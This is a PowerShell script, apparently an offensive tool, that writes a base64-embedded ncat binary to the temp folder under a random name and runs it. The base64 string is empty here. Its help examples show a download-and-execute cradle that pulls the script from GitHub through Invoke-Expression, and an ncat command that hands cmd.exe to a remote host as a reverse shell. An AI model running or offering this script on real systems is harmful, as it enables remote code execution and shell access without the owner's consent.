function Invoke-Ncat{

<# 
.SYNOPSIS

Author: @whitej3rry

.DESCRIPTION

This is a simple powershell script which uses ncat PE to run ncat commands for the good ;)

ncat, nc, PowerShell netcat

.PARAMETER ArgumentList

Ncat Command to be executed

.EXAMPLE

Listening on port 8080

PS> Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/whitej3rry/PowerShell-Ncat/master/Invoke-Ncat.ps1')
PS> Invoke-Ncat -ArgumentList "-l 8080 -ssl -v" 

Connecting to target on port 9006
PS> Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/whitej3rry/PowerShell-Ncat/master/Invoke-Ncat.ps1')
PS> Invoke-Ncat -ArgumentList "192.168.100.2 9006 -ssl -e cmd.exe -v" 

#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ArgumentList
        )

    

$ncat = ""
$content = [Convert]::FromBase64String($ncat)

Set-Content -Path $env:temp\tIaSTpEXB.exe -Value $content -Encoding Byte
Start-Process -NoNewWindow -FilePath $env:temp\tIaSTpEXB.exe -ArgumentList $ArgumentList

#Remove-Item $env:temp\tIaSTpEXB.exe


}

